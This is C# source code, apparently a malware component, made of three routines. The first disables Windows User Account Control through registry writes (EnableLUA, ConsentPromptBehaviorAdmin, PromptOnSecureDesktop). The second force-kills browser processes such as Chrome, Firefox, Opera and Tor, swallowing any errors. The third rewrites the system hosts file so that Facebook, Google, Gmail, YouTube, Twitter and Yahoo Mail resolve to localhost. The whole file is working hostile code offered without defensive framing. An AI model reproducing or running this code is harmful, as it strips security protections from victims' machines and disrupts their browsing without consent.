using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;

internal static class Active
{
    #region UACDeactive
    public static void UAC()
    {
        try
        {
            RegistryKey uac = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
            if (uac == null)
            {
                uac = Registry.CurrentUser.CreateSubKey((@"Software\Microsoft\Windows\CurrentVersion\Policies\System"));
            }
            uac.SetValue("EnableLUA", 0);
            uac.Close();
        }
        catch { }
        try
        {
            RegistryKey uac2 =
            Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
            if (uac2 == null)
            {
                uac2 = Registry.LocalMachine.CreateSubKey((@"Software\Microsoft\Windows\CurrentVersion\Policies\System"));
            }
            uac2.SetValue("ConsentPromptBehaviorAdmin", 0);
            uac2.Close();
        }
        catch { }
        try
        {
            RegistryKey uac3 =
            Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
            if (uac3 == null)
            {
                uac3 = Registry.LocalMachine.CreateSubKey((@"Software\Microsoft\Windows\CurrentVersion\Policies\System"));
            }
            uac3.SetValue("PromptOnSecureDesktop", 0);
            uac3.Close();
        }
        catch { }
        try
        {
            RegistryKey uac4 =
            Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
            if (uac4 == null)
            {
                uac4 = Registry.LocalMachine.CreateSubKey((@"Software\Microsoft\Windows\CurrentVersion\Policies\System"));
            }
            uac4.SetValue("EnableLUA", 0);
            uac4.Close();
        }
        catch { }
    }
    #endregion
    #region KilledProcess
    public static void KillProc()
    {
        try
        {
            string[] PCKill = new string[] { "amigo", "chrome", "browser", "opera", "seamonkey", "firefox", "tor", "Maxthon" };
            foreach (string str in PCKill)
            {
                Process[] PN = Process.GetProcessesByName(str);
                foreach (Process z in PN)
                {
                    z.Kill();
                }
            }
        }
        catch { }
    }
    #endregion
    #region EditHosts
    public static void HG()
    {
        string path = Environment.GetFolderPath(Environment.SpecialFolder.System) + @"\drivers\etc\hosts";
        using (StreamWriter sw = new StreamWriter(path,true))
        {
            const string localhost = "127.0.0.1";
            List<string> lDomains = new List<string>
    {
        "m.facebook.com", "www.google.com", "wwww.youtube.com",
        "www.twitter.com", "www.facebook.com", "www.gmail.com",
        "mail.yahoo.com"
    };
            sw.WriteLine(Environment.NewLine);
            foreach (var domain in lDomains)
                sw.WriteLine("{0} {1}", localhost, domain);
        }
    }
    #endregion EditHosts
}